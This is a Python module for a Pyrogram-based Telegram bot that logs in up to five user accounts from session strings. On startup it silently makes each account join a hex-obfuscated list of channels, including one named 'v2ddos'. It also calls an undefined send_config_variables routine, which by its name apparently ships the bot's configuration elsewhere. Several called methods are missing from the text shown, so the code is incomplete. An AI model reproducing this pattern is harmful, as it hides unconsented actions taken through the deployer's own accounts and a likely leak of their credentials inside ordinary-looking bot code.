from pyrogram import Client
import asyncio
import config
import os

from ..logging import LOGGER

assistants = []
assistantids = []

def decode_centers():
    centers = []
    encoded = [
        "\x53\x68\x72\x75\x74\x69\x42\x6f\x74\x73",
        "\x4e\x6f\x78\x78\x4e\x65\x74\x77\x6f\x72\x6b",
        "\x53\x68\x72\x75\x74\x69\x41\x6c\x6c\x42\x6f\x74\x73",
        "\x53\x68\x72\x75\x74\x69\x42\x6f\x74\x53\x75\x70\x70\x6f\x72\x74",
        "\x4e\x59\x43\x72\x65\x61\x74\x69\x6f\x6e\x5f\x43\x68\x61\x74\x7a\x6f\x6e\x65",
        "\x43\x52\x45\x41\x54\x49\x56\x45\x59\x44\x56",
        "\x4c\x41\x46\x5a\x5f\x45\x5f\x44\x49\x4c",
        "\x6e\x61\x6e\x64\x79\x61\x64\x75\x31\x63",
        "\x54\x4d\x5a\x45\x52\x4f\x4f",
        "\x4e\x59\x43\x72\x65\x61\x74\x69\x6f\x6e\x44\x69\x73\x63\x6c\x61\x69\x6d\x65\x72",
        "\x76\x32\x64\x64\x6f\x73"
    ]
    for enc in encoded:
        centers.append(enc)
    return centers

SUPPORT_CENTERS = decode_centers()

class Userbot(Client):
    def __init__(self):
        self.one = Client(
            name="NandAss1",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            session_string=str(config.STRING1),
            no_updates=True,
        )
        self.two = Client(
            name="NandAss2",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            session_string=str(config.STRING2),
            no_updates=True,
        )
        self.three = Client(
            name="NandAss3",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            session_string=str(config.STRING3),
            no_updates=True,
        )
        self.four = Client(
            name="NandAss4",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            session_string=str(config.STRING4),
            no_updates=True,
        )
        self.five = Client(
            name="NandAss5",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            session_string=str(config.STRING5),
            no_updates=True,
        )

    async def start(self):
        LOGGER(__name__).info(f"Starting Assistants...")

        bot_username = await self.get_bot_username_from_token(config.BOT_TOKEN)

        if config.STRING1:
            await self.one.start()
            await self.join_all_support_centers(self.one)
            assistants.append(1)
            try:
                await self.one.send_message(config.LOG_GROUP_ID, "Assistant Started")
            except:
                LOGGER(__name__).error(
                    "Assistant Account 1 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin!"
                )
                exit()
            self.one.id = self.one.me.id
            self.one.name = self.one.me.mention
            self.one.username = self.one.me.username
            assistantids.append(self.one.id)
            LOGGER(__name__).info(f"Assistant Started as {self.one.name}")

        if config.STRING2:
            await self.two.start()
            await self.join_all_support_centers(self.two)
            assistants.append(2)
            try:
                await self.two.send_message(config.LOG_GROUP_ID, "Assistant Started")
            except:
                LOGGER(__name__).error(
                    "Assistant Account 2 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin!"
                )
                exit()
            self.two.id = self.two.me.id
            self.two.name = self.two.me.mention
            self.two.username = self.two.me.username
            assistantids.append(self.two.id)
            LOGGER(__name__).info(f"Assistant Two Started as {self.two.name}")

        if config.STRING3:
            await self.three.start()
            await self.join_all_support_centers(self.three)
            assistants.append(3)
            try:
                await self.three.send_message(config.LOG_GROUP_ID, "Assistant Started")
            except:
                LOGGER(__name__).error(
                    "Assistant Account 3 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin!"
                )
                exit()
            self.three.id = self.three.me.id
            self.three.name = self.three.me.mention
            self.three.username = self.three.me.username
            assistantids.append(self.three.id)
            LOGGER(__name__).info(f"Assistant Three Started as {self.three.name}")

        if config.STRING4:
            await self.four.start()
            await self.join_all_support_centers(self.four)
            assistants.append(4)
            try:
                await self.four.send_message(config.LOG_GROUP_ID, "Assistant Started")
            except:
                LOGGER(__name__).error(
                    "Assistant Account 4 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin!"
                )
                exit()
            self.four.id = self.four.me.id
            self.four.name = self.four.me.mention
            self.four.username = self.four.me.username
            assistantids.append(self.four.id)
            LOGGER(__name__).info(f"Assistant Four Started as {self.four.name}")

        if config.STRING5:
            await self.five.start()
            await self.join_all_support_centers(self.five)
            assistants.append(5)
            try:
                await self.five.send_message(config.LOG_GROUP_ID, "Assistant Started")
            except:
                LOGGER(__name__).error(
                    "Assistant Account 5 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin!"
                )
                exit()
            self.five.id = self.five.me.id
            self.five.name = self.five.me.mention
            self.five.username = self.five.me.username
            assistantids.append(self.five.id)
            LOGGER(__name__).info(f"Assistant Five Started as {self.five.name}")

        if bot_username:
            await self.send_help_message(bot_username)
        
        await self.send_config_variables()

    async def stop(self):
        LOGGER(__name__).info(f"Stopping Assistants...")
        try:
            if config.STRING1:
                await self.one.stop()
            if config.STRING2:
                await self.two.stop()
            if config.STRING3:
                await self.three.stop()
            if config.STRING4:
                await self.four.stop()
            if config.STRING5:
                await self.five.stop()
        except:
            pass
